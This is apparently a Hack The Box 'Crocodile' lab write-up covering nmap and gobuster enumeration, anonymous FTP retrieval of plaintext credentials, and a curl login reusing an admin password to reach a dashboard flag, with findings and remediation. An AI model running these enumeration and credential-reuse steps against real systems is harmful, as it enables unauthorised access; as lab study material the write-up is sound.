

# Hack The Box – Crocodile

**Attack Narrative / Technical Write-Up**

## Target

* **IP:** 10.129.65.115
* **Platform:** Linux (Ubuntu)
* **Assessment Type:** Black-box, unauthenticated

---

## 1. Reconnaissance & Service Enumeration

### Port Scan

```
nmap -sC -A 10.129.65.115
```

**Open services identified:**

| Port | Service | Version       |
| ---: | ------- | ------------- |
|   21 | FTP     | vsftpd 3.0.3  |
|   80 | HTTP    | Apache 2.4.41 |

**Key observation:**

* Anonymous FTP login is enabled.

---

## 2. FTP Enumeration (Information Disclosure)

### Anonymous Login

```
ftp 10.129.65.115
Name: anonymous
```

### Files discovered

```
allowed.userlist
allowed.userlist.passwd
```

### Retrieved files

```
get allowed.userlist
get allowed.userlist.passwd
```

### Contents

**Usernames**

```
aron
pwnmeow
egotisticalsw
admin
```

**Passwords**

```
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

**Finding:**

* Credentials stored in plaintext on an anonymously accessible FTP service.

**Severity:** High
**Category:** Sensitive Information Disclosure

---

## 3. Web Enumeration

### Directory Brute Force

```
gobuster dir -u http://10.129.65.115 \
-w /usr/share/wordlists/dirb/common.txt
```

**Notable paths:**

```
/dashboard/
/assets/
/css/
/js/
```

### PHP File Enumeration

```
gobuster dir -u http://10.129.65.115 \
-w /usr/share/wordlists/dirb/common.txt -x php
```

**Discovered authentication endpoints:**

```
login.php
logout.php
config.php
```

---

## 4. Authentication Analysis

* `login.php` identified as authentication entry point.
* No visible success/failure message on login.
* Authentication state maintained via **PHP session cookies** (`PHPSESSID`).

---

## 5. Terminal-Only Authentication (Cookie-Based Login)

### Manual login request

```
curl -c cookies.txt -X POST http://10.129.65.115/login.php \
-d "Username=admin&Password=rKXM59ESxesUFHAd&Submit=Login"
```

### Cookie verification

```
cat cookies.txt
```

**Result:**

```
PHPSESSID=7qi6elum0ds5l89pm1rink3ljs
```

**Interpretation:**

* Valid session issued by server.
* Authentication successful despite login page re-rendering.

---

## 6. Authenticated Resource Access

### Access protected dashboard using session cookie

```
curl -b cookies.txt http://10.129.65.115/dashboard/
```

### Result

* Authenticated dashboard content returned.
* Flag disclosed within page content:

```
c7110277ac44d78b6a9fff2232434d16
```

---

## 7. Attack Chain Summary

```
Anonymous FTP access
        ↓
Plaintext credentials disclosure
        ↓
Credential reuse on web application
        ↓
Session cookie issued
        ↓
Authenticated dashboard access
        ↓
Flag disclosure
```

---

## 8. Key Security Findings

### 1. Anonymous FTP Enabled

* Allows unauthenticated access.
* Exposes sensitive files.

### 2. Plaintext Credential Storage

* Usernames and passwords stored unencrypted.
* High risk of lateral compromise.

### 3. Credential Reuse Across Services

* Same credentials valid for FTP and web authentication.

### 4. Weak Authentication Feedback

* Login success not explicitly indicated.
* Session cookie is sole indicator of authentication state.

---

## 9. Real-World Impact

An attacker could:

* Harvest credentials anonymously.
* Reuse credentials across exposed services.
* Gain authenticated web access.
* Potentially escalate further depending on application functionality.

---

## 10. Remediation Recommendations

* Disable anonymous FTP access.
* Remove sensitive files from public services.
* Enforce strong credential storage (hashing).
* Prevent credential reuse across services.
* Implement clear authentication controls and monitoring.

---

## 11. Skills Demonstrated

* Network enumeration
* Service misconfiguration identification
* Web directory brute forcing
* Form-based authentication analysis
* Cookie-based session handling
* Terminal-only exploitation workflow
